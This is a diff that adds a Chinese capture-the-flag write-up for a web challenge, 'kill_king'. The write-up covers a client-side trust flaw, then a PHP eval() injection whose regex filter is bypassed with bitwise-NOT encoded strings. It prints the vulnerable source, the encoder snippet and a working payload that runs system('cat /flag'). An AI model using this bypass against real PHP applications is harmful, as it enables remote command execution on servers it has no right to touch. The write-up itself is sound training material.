@@ -300,3 +300,54 @@ setTimeout["constructor"]
 
 然后有个html是找ai生成的本地编码解码网页，含有常见的命令生成。
 
+**kill_king**
+
+这里正常玩游戏肯定是不行的，一种方法是改一下每次加点的数据，还有一种是源码里直接给出来的，只不过要自己找一下：
+<img width="1469" height="698" alt="image" src="https://github.com/user-attachments/assets/2fe3df8d-b05b-4371-9f64-fc33d5ff50e0" />
+
+这里的漏洞属于典型的 Client-Side Trust（客户端信任） 问题。 服务器端文件 check.php 似乎完全信任前端发送的数据。它并没有校验玩家是否真的击败了 Boss、攻击力数值是否合法或游戏时长是否合理，它仅仅是判断它是否收到了 result=win 的 POST 请求，那么我们可以直接在hackbar里面改一下进去：
+```php
+<?php
+// 国王并没用直接爆出flag，而是出现了别的东西？？？
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['result']) && $_POST['result'] === 'win') {
+        highlight_file(__FILE__);
+        if(isset($_GET['who']) && isset($_GET['are']) && isset($_GET['you'])){
+            $who = (String)$_GET['who'];
+            $are = (String)$_GET['are'];
+            $you = (String)$_GET['you'];
+        
+            if(is_numeric($who) && is_numeric($are)){
+                if(preg_match('/^\W+$/', $you)){
+                    $code =  eval("return $who$you$are;");
+                    echo "$who$you$are = ".$code;
+                }
+            }
+        }
+    } else {
+        echo "Invalid result.";
+    }
+} else {
+    echo "No access.";
+}
+?>
+```
+这里要求传入三个参数，并且who和are必须是数字，you必须是非单词字符（不能包含 A-Z, a-z, 0-9, _）、
+
+我们需要执行 system('cat /flag')，但 system、cat、flag 都是字母，会被正则拦截。
+
+使用 PHP 取反绕过技术。 在 PHP 中，我们可以对字符串进行按位取反操作。例如 ~"system" 会变成一串不可见的乱码（高位字符）。这些乱码不属于 [a-zA-Z0-9_]，因此可以绕过 W 正则。 当 PHP 执行 (~"乱码") 时，它会还原回 "system"。
+
+用三元表达式可以构造出return 1?system(cat /flag):1来执行system()方法，由于是直接拼接进参数里，$you进行取反：
+```php
+<?php
+echo urlencode(~'system')."\n";
+echo urlencode(~'cat /flag');
+
+//%8C%86%8C%8B%9A%92
+//%9C%9E%8B%DF%D0%99%93%9E%98
+```
+最终的构造：?who=1&you=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98):&are=1
+<img width="2911" height="533" alt="image" src="https://github.com/user-attachments/assets/e314541a-8ca7-4b3c-b799-6de8777d43eb" />
+
+
